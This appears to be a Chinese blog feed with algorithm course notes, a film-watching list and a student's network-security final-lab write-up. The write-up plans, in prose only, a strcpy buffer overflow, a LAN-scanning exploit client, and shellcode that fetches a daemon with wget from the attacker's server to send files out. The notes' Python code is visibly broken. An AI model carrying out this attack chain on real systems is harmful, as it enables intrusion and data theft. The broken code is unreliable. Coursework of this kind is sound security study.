<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618002946332.png" alt="image-20200618002946332"></p>
<h2 id="最长公共子序列"><a href="#最长公共子序列" class="headerlink" title="最长公共子序列"></a>最长公共子序列</h2><p>给定两个定义在字符集<strong>∑</strong>上的字符串A和 B，长度分别为n和m，现在要求它们的最长公共子序列的长度值(最优值)，以及对应的子序列(最优解) 。</p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618005033825.png" alt="image-20200618005033825"></p>
<h2 id="其他问题-1"><a href="#其他问题-1" class="headerlink" title="其他问题"></a>其他问题</h2><ul>
<li><p>钢条切割问题：<img src="/2020/07/07/2020-07-07-algorithm/image-20200618004917079.png" alt="image-20200618004917079"></p>
</li>
<li><p>最大子数组问题sum[i+1] = max(sum[i]+a[i+1], a[i+1])</p>
</li>
<li><p>爬楼梯（第二个楼梯就有两种走法。）：dp[i] = dp[i-1]+dp[i-2]</p>
</li>
<li><p>最长连续有效括号长度：</p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618005426781.png" alt="image-20200618005426781"></p>
</li>
</ul>
<h1 id="三、贪心"><a href="#三、贪心" class="headerlink" title="三、贪心"></a>三、贪心</h1><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618005649956.png" alt="image-20200618005649956"></p>
<h2 id="活动安排问题"><a href="#活动安排问题" class="headerlink" title="活动安排问题"></a>活动安排问题</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618005723278.png" alt="image-20200618005723278"></p>
<h2 id="小数背包问题"><a href="#小数背包问题" class="headerlink" title="小数背包问题"></a>小数背包问题</h2><p>计算每种物品的<strong>单位重量-价值</strong>作为贪心选择的依据指标，选择<strong>单位重量-价值最高</strong>的物品，将尽可能多的该物品装入背包，依此策略一直地进行下去，直到背包装满为止。<img src="/2020/07/07/2020-07-07-algorithm/image-20200618005909341.png" alt="image-20200618005909341"></p>
<h2 id="Dijkstra单源最短路径问题-✍"><a href="#Dijkstra单源最短路径问题-✍" class="headerlink" title="Dijkstra单源最短路径问题  ✍"></a>Dijkstra单源最短路径问题  ✍</h2><p>给定带权有向图G =(V,E)，其中每条边的权是非负实数。另外，还给定V中的一个顶点，称为<strong>源</strong>。现在要计算从源到所有其他各顶点的<strong>最短长度</strong>。这里路的长度是指路上各边权之和。这个问题通常称为<strong>单源最短路径</strong>问题。 </p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618010401065.png" alt="image-20200618010401065"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618010537461.png" alt="image-20200618010537461"></p>
<h2 id="单源最短路径（存在？）：Bellman-Ford"><a href="#单源最短路径（存在？）：Bellman-Ford" class="headerlink" title="单源最短路径（存在？）：Bellman-Ford"></a>单源最短路径（存在？）：Bellman-Ford</h2><ul>
<li>推理：如果在|V|-1 次循环后，d[v]不能收敛，则存在权重为负的环路</li>
</ul>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618011326388.png" alt="image-20200618011326388"></p>
<h2 id="最小生成树"><a href="#最小生成树" class="headerlink" title="最小生成树"></a>最小生成树</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618011551452.png" alt="image-20200618011551452"></p>
<h3 id="Prim算法-——避圈法-Θ-n-2-✍🆗"><a href="#Prim算法-——避圈法-Θ-n-2-✍🆗" class="headerlink" title="Prim算法  ——避圈法  Θ(n^2^)  ✍🆗"></a>Prim算法  ——避圈法  Θ(n^2^)  ✍🆗</h3><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618012144452.png" alt="image-20200618012144452"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618012437116.png" alt="image-20200618012437116"></p>
<h3 id="Kruskal算法-——避圈法-O-mlogm-n-✍🆗"><a href="#Kruskal算法-——避圈法-O-mlogm-n-✍🆗" class="headerlink" title="Kruskal算法    ——避圈法 O(mlogm+n)  ✍🆗"></a>Kruskal算法    ——避圈法 O(mlogm+n)  ✍🆗</h3><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618011725626.png" alt="image-20200618011725626"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618012448158.png" alt="image-20200618012448158"></p>
<h3 id="破圈法-（”-圈”指的是回路）"><a href="#破圈法-（”-圈”指的是回路）" class="headerlink" title="破圈法  （” 圈”指的是回路）"></a>破圈法  （” 圈”指的是回路）</h3><p>求最小生成树有两种方法，一种是破圈法，另一种是避圈法（Kruskal,Prim也是求MST的算法）。</p>
<p>破圈法是“见圈破圈”，即如果看到图中有一个圈，就将这个圈的边去掉一条，直至图中再无一圈为止。</p>
<p>步骤如下：</p>
<ol>
<li>在图中找一个回路</li>
<li>去掉该回路中权值最大的边，但要保持图仍为连通。</li>
<li>反复此过程，直至图中再无回路（但仍保持连通），得到最小生成树。</li>
</ol>
<p>最后结果根据操作选取不同可能不唯一，但图的权值和（生成树的代价）相同，均为最小值。</p>
<p>避圈法则采取先将图中的点都取出来，然后，逐渐向上面添边，并保证后添入的边不与以前添上的边构成圈就可以了，这个过程直到将边集中能加入的边（加入后不够成圈）都加完为止。参见词条“Prim算法”和“Kruskal算法”。</p>
<h2 id="其他问题-2"><a href="#其他问题-2" class="headerlink" title="其他问题"></a>其他问题</h2><ul>
<li>找硬币，最少找硬币数</li>
<li>霍夫曼编码：（编码）将每个码字连接起来。最低频的两个字符在最优编码树中，一定是深度最深的两个叶子</li>
<li>孩子分糖，最多满足孩子数，从最容易满足的孩子找最小的糖</li>
</ul>
<h1 id="四、图的遍历"><a href="#四、图的遍历" class="headerlink" title="四、图的遍历"></a>四、图的遍历</h1><h2 id="深度优先搜索树-⭐"><a href="#深度优先搜索树-⭐" class="headerlink" title="深度优先搜索树 ⭐"></a>深度优先搜索树 ⭐</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618170234724.png" alt="image-20200618170234724"></p>
<ul>
<li><p><strong>predfn（先序号）</strong>：在图的深度优先搜索生成树(森林)中顶点的先序号，是指按照先序方式访问该生成树，该顶点的序号。</p>
</li>
<li><p><strong>postdfn（后序号）</strong>：在图的深度优先搜索生成树(森林)中顶点的后序号，是指按照后序方式访问该生成树，该顶点的序号。</p>
</li>
</ul>
<p><strong>无向图只有两条边——树边、回边</strong> （由于前向边、横跨边的定义） </p>
<p>*<em>有向图情形 ——四种边 *</em> Θ(n^2^ ) 使用邻接矩阵</p>
<blockquote>
<p>广度优先中：</p>
<p>在无向图中，边分为：树边或者是横跨边。(横跨边没有父子关系)</p>
<p>在有向图中，边分为：树边，回边及横跨边。不存在前向边。</p>
</blockquote>
<ul>
<li><p>树边(Tree edges)－ 深度优先搜索生成树中的边：探测边(v,w)时，w是 “unvisited”状态，则边(v,w)是树边。</p>
</li>
<li><p>回边(Back edges)－在迄今为止所构建的深度优先搜索生成树中，w是v的祖先，并且在探测(v,w)时，w已经被标记为”visited”,则(v,w)为回边。 </p>
</li>
<li><p>前向边(Forward edges)－在迄今为止所构建的深度优先搜索生成树中，w是v的后裔，并且在探测(v,w)时，w已经被标记为”visited”,则(v,w)为前向边。 </p>
</li>
<li><p>横跨边(Cross edges)－所有其他的边。</p>
</li>
</ul>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618170207228.png" alt="image-20200618170207228"></p>
<h2 id="广度优先搜索树"><a href="#广度优先搜索树" class="headerlink" title="广度优先搜索树"></a>广度优先搜索树</h2><p>在无向图中，边分为：树边或者是横跨边。</p>
<p>在有向图中，边分为：树边，回边及横跨边。不存在前向边。</p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618175112082.png" alt="image-20200618175112082"></p>
<h2 id="图的无回路性判定-有向-无向图"><a href="#图的无回路性判定-有向-无向图" class="headerlink" title="图的无回路性判定  有向/无向图"></a>图的无回路性判定  有向/无向图</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618174030579.png" alt="image-20200618174030579"></p>
<h2 id="拓扑排序-——有向图"><a href="#拓扑排序-——有向图" class="headerlink" title="拓扑排序  ——有向图"></a>拓扑排序  ——有向图</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618174500149.png" alt="image-20200618174500149"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618174445964.png" alt="image-20200618174445964"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618174428002.png" alt="image-20200618174428002">    </p>
<h2 id="强连通分支-——有向图-✍"><a href="#强连通分支-——有向图-✍" class="headerlink" title="强连通分支 ——有向图  ✍"></a>强连通分支 ——有向图  ✍</h2><p>有向图G=(V,E)，强连通集为顶点的极大集。<strong>在该集合中，每一对顶点都存在一条路径</strong>。</p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618174607857.png" alt="image-20200618174607857"></p>
<ul>
<li>首先深度优先搜索，得到postdfn后序号</li>
<li>颠倒G中边的方向，构成一个新的图G’</li>
<li>图G’从最大的postdfn开始执行深搜，如果不能达到所有节点，换一个顶点继续</li>
<li>最后得到的森林中，每棵树对应一个强连通分支</li>
</ul>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618174801988.png" alt="image-20200618174801988"></p>
<h1 id="五、回溯法"><a href="#五、回溯法" class="headerlink" title="五、回溯法"></a>五、回溯法</h1><p>节点是由<strong>深度优先搜索方法生成</strong>的。<strong>不需要存储整棵搜索树，只需要存储根到当前活动节点的路径</strong>。</p>
<ul>
<li>活节点：正常节点</li>
<li>扩展节点：当前节点，正在对此节点进行搜索</li>
<li>死节点：不可行节点，无需对其下面的节点进行搜索</li>
</ul>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618180648879.png" alt="image-20200618180648879"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618180641217.png" alt="image-20200618180641217"></p>
<h2 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618183544530.png" alt="image-20200618183544530"></p>
<p>递归回溯</p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618183408900.png" alt="image-20200618183408900"></p>
<p>迭代回溯</p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618183418523.png" alt="image-20200618183418523"></p>
<h2 id="皇后问题"><a href="#皇后问题" class="headerlink" title="皇后问题"></a>皇后问题</h2><p>所以，尽管在最坏情况下要用O(n^n^)时间来求解，然而大量实际经验表明，它在有效性上远远超过蛮力方法O(n!)。例如在4 皇后问题中，只搜索了341个节点中的27个就找到了解。 </p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618181044719.png" alt="image-20200618181044719"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618181024810.png" alt="image-20200618181024810"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618181018188.png" alt="image-20200618181018188"></p>
<h2 id="分支界限法-与-回溯法的区别（旅行商TSP）"><a href="#分支界限法-与-回溯法的区别（旅行商TSP）" class="headerlink" title="分支界限法 与 回溯法的区别（旅行商TSP）"></a>分支界限法 与 回溯法的区别（旅行商TSP）</h2><p>分支限界法与回溯法的<strong>搜索方式</strong>不同</p>
<ul>
<li><p>回溯法：深度优先</p>
</li>
<li><p>分支限界法：广度优先或最小耗费（最大收益）优先</p>
</li>
</ul>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618184212297.png" alt="image-20200618184212297"></p>
<p>两种分支限界法：</p>
<ul>
<li><p>队列式(FIFO)分支限界法(宽度优先)：按照队列先进先出（FIFO）原则选取下一个节点为扩展节点。</p>
</li>
<li><p><strong>优先队列式分支限界法</strong>(最小耗费或是最大收益优先)：按照优先队列中规定的优先级选取优先级最高的节点成为当前扩展节点。</p>
<ul>
<li>最大优先队列：使用最大堆，体现最大收益优先</li>
<li>最小优先队列：使用最小堆，体现最小耗费优先</li>
</ul>
</li>
</ul>
<h3 id="旅行商"><a href="#旅行商" class="headerlink" title="旅行商"></a>旅行商</h3><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618185211728.png" alt="image-20200618185211728"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618185122634.png" alt="image-20200618185122634"></p>
<h1 id="第六章、NP问题"><a href="#第六章、NP问题" class="headerlink" title="第六章、NP问题"></a>第六章、NP问题</h1><p><strong>如果对一个问题∏存在一个算法，时间复杂性为O(n^k^)，其中n是问题规模，k是一个非负整数，则称问题∏存在多项式时间算法。</strong>这类算法在可以接受的时间内实现问题求解</p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618185259193.png" alt="image-20200618185259193"></p>
<h2 id="1-P、NP、NPC、co-NP"><a href="#1-P、NP、NPC、co-NP" class="headerlink" title="1. P、NP、NPC、co-NP"></a>1. P、NP、NPC、co-NP</h2><p>P属于NP，人们猜测P ≠ NP，但是否成立，至今未得到证明。</p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618190959962.png" alt="image-20200618190959962"></p>
<h3 id="1-P类问题"><a href="#1-P类问题" class="headerlink" title="1 P类问题"></a><strong>1 P类问题</strong></h3><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618185944301.png" alt="image-20200618185944301"></p>
<h3 id="2-NP类问题"><a href="#2-NP类问题" class="headerlink" title="2 NP类问题"></a><strong>2 NP类问题</strong></h3><p>非确定性算法：就是说，能以猜测和验证的方式工作，而且两个步骤都能在多项式时间内完成。</p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618190230249.png" alt="image-20200618190230249"></p>
<p>np问题：即每个实例都可以用非确定性算法得出一个yes/no的答案。</p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618190115671.png" alt="image-20200618190115671"></p>
<h3 id="3-NPC问题"><a href="#3-NPC问题" class="headerlink" title="3 NPC问题"></a><strong>3 NPC问题</strong></h3><ul>
<li>证明问题A是NP问题</li>
<li>证明一个已证的NPC问题可多项式输入转化为问题A，而其俩的输出可以相互转化。s</li>
</ul>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618190709531.png" alt="image-20200618190709531"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618190941751.png" alt="image-20200618190941751"></p>
<h3 id="4-NP-Hard"><a href="#4-NP-Hard" class="headerlink" title="4 NP-Hard"></a>4 NP-Hard</h3><p>NP-Hard不是NP问题，但是和NPC一样难</p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618192130504.png" alt="image-20200618192130504"></p>
<h3 id="5-co-NP问题"><a href="#5-co-NP问题" class="headerlink" title="5 co-NP问题"></a>5 co-NP问题</h3><p>就是说，NP的猜测和验证只需要进行到某个x正确就结束了。co-NP的猜测和验证必须要全遍历全部x吗?</p>
<p>我是纠结在了，co-NP也是猜测和验证上的hh，现在看来确实不一样</p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618191247412.png" alt="image-20200618191247412"></p>
<h2 id="2-最大团-SAT∝poly团-⭐"><a href="#2-最大团-SAT∝poly团-⭐" class="headerlink" title="2. 最大团  (SAT∝poly团) ⭐"></a>2. 最大团  (SAT∝<del>poly</del>团) ⭐</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618191635190.png" alt="image-20200618191635190"></p>
<h2 id="3-三元可满足性问题3SAT-SAT∝poly3SAT"><a href="#3-三元可满足性问题3SAT-SAT∝poly3SAT" class="headerlink" title="3. 三元可满足性问题3SAT     (SAT∝poly3SAT)"></a>3. 三元可满足性问题3SAT     (SAT∝<del>poly</del>3SAT)</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618191833664.png" alt="image-20200618191833664"></p>
<h2 id="4-顶点覆盖问题-3SAT∝polyVC-重点看📕"><a href="#4-顶点覆盖问题-3SAT∝polyVC-重点看📕" class="headerlink" title="4. 顶点覆盖问题  (3SAT∝polyVC) 重点看📕"></a>4. 顶点覆盖问题  (3SAT∝<del>poly</del>VC) 重点看📕</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618192412490.png" alt="image-20200618192412490"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200619121945353.png" alt="image-20200619121945353"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200619122459457.png" alt="image-20200619122459457"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200619125859905.png" alt="image-20200619125859905"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200619130009272.png" alt="image-20200619130009272"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200619125921925.png" alt="image-20200619125921925"></p>
<h2 id="第二章-动态规划"><a href="#第二章-动态规划" class="headerlink" title="第二章 动态规划"></a>第二章 动态规划</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200619125942195.png" alt="image-20200619125942195"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200619130057070.png" alt="image-20200619130057070"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200619131851675.png" alt="image-20200619131851675"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CHESS_COIN</span><span class="params">(c)</span>:</span></span><br><span class="line">    lenc=len(c)</span><br><span class="line">    OPT=[lenc][lenc]</span><br><span class="line"><span class="comment">#这是上半部分初始化最高行的代码：</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(lenc):    <span class="comment">#遍历最高行(y)的每列(x)，从0~n-1</span></span><br><span class="line">		 OPT(i,lenc<span class="number">-1</span>)=(i,lenc<span class="number">-1</span>)</span><br><span class="line"><span class="comment">#这是下半部分遍历计算的代码：</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(lenc<span class="number">-1</span>:<span class="number">0</span>):  <span class="comment">#遍历行(y)，从n-2~0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(lenc):  <span class="comment">#遍历列(x)，从0~n-1</span></span><br><span class="line">            <span class="keyword">if</span> i==<span class="number">0</span> :		 <span class="comment">#最左列</span></span><br><span class="line">                OPT(i,j)=max(OPT(i,j+<span class="number">1</span>),OPT(i+<span class="number">1</span>,j+<span class="number">1</span>))+c(i,j)</span><br><span class="line">            <span class="keyword">elif</span> i==n<span class="number">-1</span>:	<span class="comment">#最右列</span></span><br><span class="line">                OPT(i,j)=max(OPT(i,j+<span class="number">1</span>),OPT(i<span class="number">-1</span>,j+<span class="number">1</span>))+c(i,j)</span><br><span class="line">            <span class="keyword">else</span>:			<span class="comment">#其余列</span></span><br><span class="line">            	OPT(i,j)=max(OPT(i,j+<span class="number">1</span>),OPT(i<span class="number">-1</span>,j+<span class="number">1</span>),OPT(i+<span class="number">1</span>,j+<span class="number">1</span>))+c(i,j)</span><br><span class="line">    <span class="keyword">return</span> OPT</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work_arrange</span><span class="params">(w)</span></span></span><br><span class="line">	OPT=[len(w)]</span><br><span class="line">    <span class="keyword">if</span> len(w)&gt;=<span class="number">1</span>:	 <span class="comment">#一天（含）以上的OPT安排	</span></span><br><span class="line">        OPT[<span class="number">0</span>]=w[<span class="number">0</span>]  <span class="comment">#w[0]是工作第0天工作的工资，为零</span></span><br><span class="line">        OPT[<span class="number">1</span>]=w[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">elif</span> len(w)&gt;=<span class="number">2</span>:	 <span class="comment">#两天（含）以上的OPT安排</span></span><br><span class="line">        OPT[<span class="number">2</span>]=w[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:			<span class="comment">#三天（含）以上的OPT安排</span></span><br><span class="line">        <span class="keyword">for</span> i=<span class="number">3</span> to len(w):  <span class="comment">#对于三天以上的每天，都有三种情况</span></span><br><span class="line">            OPT[i]=max(OPT[i<span class="number">-1</span>],OPT[i<span class="number">-2</span>]+w[i],OPT[i<span class="number">-3</span>]+w[i<span class="number">-1</span>]+w[i]) </span><br><span class="line">    <span class="keyword">return</span> OPT</span><br></pre></td></tr></table></figure>

<h2 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200619130115423.png" alt="image-20200619130115423"></p>
<h2 id="第四章"><a href="#第四章" class="headerlink" title="第四章"></a>第四章</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200619130132348.png" alt="image-20200619130132348"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200619131155873.png" alt="image-20200619131155873"></p>
<h2 id="第五章-回溯法"><a href="#第五章-回溯法" class="headerlink" title="第五章 回溯法"></a>第五章 回溯法</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200619130151111.png" alt="image-20200619130151111"></p>
<h2 id="第六章"><a href="#第六章" class="headerlink" title="第六章"></a>第六章</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200619121945353.png" alt="image-20200619121945353"></p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>观影记录</title>
    <url>/2020/06/29/2020-06-29-Viewing-record/</url>
    <content><![CDATA[<p><img src="/2020/06/29/2020-06-29-Viewing-record/image-20200714012526750.png" alt="image-20200714012526750"></p>
<a id="more"></a>

<h1 id="观影记录——2020-06-06"><a href="#观影记录——2020-06-06" class="headerlink" title="观影记录——2020-06-06"></a>观影记录——2020-06-06</h1><ul>
<li>《银魂完结篇：直到永远的万事屋》由于之前没看过银魂，很多梗get不到，喜剧</li>
<li>《楚门的世界》没看</li>
<li>《刺客信条》2016，听说不好，但特效ok</li>
<li>《飞驰人生》19年春节档，歌《奉献》</li>
<li>《彗星来的那一夜》没看</li>
<li>《黑豹》</li>
<li>《让子弹飞》姜文，有内涵的喜剧</li>
<li>《西虹市首富》喜剧片，歌《燃烧我的卡路里》</li>
<li>《恋恋笔记本》需要静下来看</li>
<li>《东邪西毒》画质太差看不下去</li>
<li>《蜘蛛侠：英雄归来》没看</li>
<li>《三傻大闹宝莱坞》喜剧，但是看不下去，跳着看</li>
<li>《大象席地而坐》没看，但是讨论很多，作者拍完就自……</li>
<li>《复仇者联盟4：终局之战》结局，19年上半年上映</li>
<li>《寄生虫》韩国社会上层和下层人的寄生关系，对社会的讽刺，获奖极多……</li>
<li>《爱乐之城》音乐剧，没看完，暂时不喜欢音乐剧</li>
<li>《霸王别姬》讲了一个很长的故事</li>
<li>《白蛇：缘起》18年下半年上映</li>
<li>《百鸟朝凤》好看</li>
<li>《大护法》记不清什么时候的电影了，好像是高三时候，血腥，有点意思</li>
<li>《大话西游之大圣娶亲》不戴金箍不能保护你，戴上金箍不能爱你</li>
<li>《刀🗡剑神域：序列之争剧场版》质量很ok的番外</li>
<li>《盗梦空间》烧脑</li>
<li>《放牛班的春天》被推荐的，还没看</li>
<li>《缝纫机乐队》好看</li>
<li>《黑客帝国》三部曲，思考人生，缸中之脑</li>
<li>《机械姬》只是看了画面下，还没看</li>
<li>《假如爱有天意》忘了</li>
<li>《教父》起飞</li>
<li>《看不见的客人》烧脑悬疑，反转极大</li>
<li>《两小无猜》没看</li>
<li>《灵魂摆渡·黄泉》还挺好看的</li>
<li>《龙猫》宫崎骏</li>
<li>《明日的我与昨日的你约会》忘了</li>
<li>《那些年，我们一起追的女孩》台湾电影</li>
<li>《你眼中的世界》这个很喜欢</li>
<li>《怦然心动》同名小说《flipped》</li>
<li>《七月与安生》没看</li>
<li>《前任3：再见前任》大一，17年下半年，电影虽然很狗血，但歌风靡一时</li>
<li>《闪光少女》讲民乐和西洋乐的冲突交集</li>
<li>《声之形》讲校园霸凌，后面逐渐向好吧</li>
<li>《死侍2》有两部，笑就完事了</li>
<li>《天使爱美丽》没看完</li>
<li>《头号玩家》18年上半年</li>
<li>《闻香识女人》人的视野，境界很重要</li>
<li>《我不是潘金莲》公选政治课老师有推荐，讲中国的上诉维权之类的</li>
<li>《我想吃掉你的胰脏》同名小说改编，19年又出了动画版</li>
<li>《无双》印钞世界，无双</li>
<li>《肖申克的救赎》看了两回，感想完全不同，估计现在看又不同</li>
<li>《绣春刀》有两部，很过瘾</li>
<li>《血观音》台湾的官场?FG推荐</li>
<li>《湮灭》科幻片</li>
<li>《妖猫传》唐玄宗，杨贵妃，李太白，值得一看</li>
<li>《遇见你真好》忘了</li>
<li>《指环王》三部，没看完</li>
<li>《中国合伙人》背景取自新东方俞敏洪，中美之间的看法挺有意思</li>
<li>《重庆森林》没看完</li>
<li>《侏罗纪世界》有几部</li>
<li>《三块广告牌》没看</li>
<li>《华尔街之狼》看了三个小时，不知道什么感受，纸醉金迷，很讽刺</li>
</ul>
<p>电视剧</p>
<ul>
<li>《鬼吹灯之怒晴湘西》比较贴近小说</li>
<li>《切尔诺贝利》美剧，跳着看</li>
<li>《权力的游戏》七季美剧，跳着看</li>
<li>《长安十二时辰》同名小说改变，张小敬……</li>
<li>《庆余年》没看</li>
<li>《西部世界》美剧，三季</li>
<li>《性教育》美剧</li>
<li>《少年谢尔顿》美剧</li>
<li>《生活大爆炸》美剧</li>
</ul>
<p>动漫，主要在b站看了</p>
<ul>
<li>《进击的巨人》</li>
<li>《斗破苍穹特别篇》很还原有两集，暂时不删了，怕以后找不到</li>
<li>《夏日大作战》动漫电影，没看完</li>
<li></li>
</ul>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全综合实验设计</title>
    <url>/2020/06/22/2020-06-22-NS-The-Final-Exam/</url>
    <content><![CDATA[<h1 id="总体设计"><a href="#总体设计" class="headerlink" title="总体设计"></a>总体设计</h1><p><strong>任务一</strong>：做一个服务端程序，其功能是：收到客户端请求之后，将请求中的字符串前后翻转，然后返回给客户端。<strong>（30 分）</strong></p>
<p><strong>任务二</strong>：基于上述服务程序，在保持基本功能的前提下，设计一个缓冲区溢出漏洞。并编写恶意客户端程序，扫描局域网内的所有机器，找到有该漏洞的服务端机器，在服务端机器上创建一个 txt 的文件，文件名是你的姓名.txt，文件内容是你的学号。<strong>（40 分）</strong></p>
<p><strong>任务三</strong>：利用上述漏洞，把一个自己设计的程序 daemon 送上服务端机器并运行，这个 daemon能够搜索服务器上的所有 txt 文件，并找出文件名中含有你的姓名的文件，并利用网络传送给客户端机器（传出的方法不限，例如：email，在线 socket 连接等）。<strong>（20 分）</strong></p>
<p><strong>任务四：</strong>在上述任务的基础上，设计一种密钥管理机制和传输加密方案，模拟将传输内容加密（包含文件名和文件内容）发送给客户端机器。用 wireshark 等工具抓取传输内容，证明未加密与加密的区别，并分析你所设计的密钥管理机制和传输加密方案的安全性。<strong>（10 分）</strong></p>
<ul>
<li><strong>对于任务一的字符串前后翻转服务端程序</strong>，我使用c语言编写，编写简单的sokcet通信服务，缓冲区溢出漏洞在其业务函数中使用了strcpy()导致栈溢出的问题。</li>
<li><strong>对于任务二的恶意客户端程序</strong>，我采用python编写，其功能有<ul>
<li>扫描遍历局域网中的ip地址，通过socket尝试连接端口，找出有运行服务端程序的机器</li>
<li>与任务一的字符串前后翻转服务端程序交互，发出字符串，然后收到翻转后的字符串并打印</li>
<li>exploit的功能，发送针对漏洞的payload（包含三种shellcode）</li>
</ul>
</li>
<li><strong>对于任务三中的程序 daemon</strong>，我使用python编写，能够搜索服务器上的任意指定文件（可以指定为我们的文件名中含有你的姓名的文件），并利用网络传送给客户端。</li>
<li><strong>对于任务四中的密钥管理机制和传输加密方案</strong><ul>
<li>首先daemon.py作为服务器（受害方）被shellcode启动</li>
<li>客户端（攻击方），启动client.py通过socket连接上该服务器，创建非对称加密RSA密钥，发送公钥和公钥Sha256摘要给服务器</li>
<li>服务器（受害方）接收到RSA的公钥和公钥摘要之后，对公钥进行摘要判断，公钥是否被改动。如没有，就产生用于 AES 对称加密的密钥，将其用RSA公钥加密后，将其密文和密文摘要发给客户端（攻击方）</li>
<li>客户端（攻击方）同上用对 AES密钥进行摘要，判断是否被改动。如没有，双方便可以用 AES密钥进行通信的加密了。</li>
</ul>
</li>
<li><strong>用 wireshark 等工具抓取传输内容，证明未加密与加密的区别</strong><ul>
<li>如果传输文件内容未加密，则wireshark 抓取到socket发送的包，可以直接在data部分看到传输的内容</li>
<li>如果传输文件内容未加密，则抓取到的包，data部分是密文，无法被破译。</li>
</ul>
</li>
<li><strong>包含了三种shellcode</strong>——创建学号.txt、下载 daemon程序、运行daemon程序<ul>
<li>创建学号.txt，汇编使用了linux的系统调用（32位下实验：调用号5打开文件、调用号6关闭文件）</li>
<li>下载 daemon程序，汇编使用了<strong>/usr/bin/wget</strong>程序来下载daemon（从攻击方开启的apache服务器中下载)</li>
<li>运行daemon程序，汇编通过<strong>/usr/bin/python daemon.py</strong>来运行</li>
</ul>
</li>
</ul>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
<li><p>这次的期末考试，看似内容很短，其实囊括了很多内容，很多功能要实现。对linux系统的一些操作、socket的通信、栈溢出漏洞的设计与调试、扫描ip端口、linux的文件搜索、密钥管理方案的设计、抓包的分析以及shellcode的编写，多多少少都学习到了一些，掌握了一些。</p>
</li>
<li><p>暴露了我一些致命的问题，对linux操作系统的不熟悉、对c、c++的陌生、很多概念只是口头上说着好，实际代码能力却不足，还希望能够进步。</p>
</li>
<li><p>觉得最大的收获估计是对linux系统的一些操作以及shellcode的编写吧，对shellcode不再是纸上谈兵。虽然shellcode可以用工具生成，但自己编写shellcode使我对其不再云里雾里，成就感很足。勾起了我安全方向的兴趣，不知道以后有没有缘分搞安全了。</p>
</li>
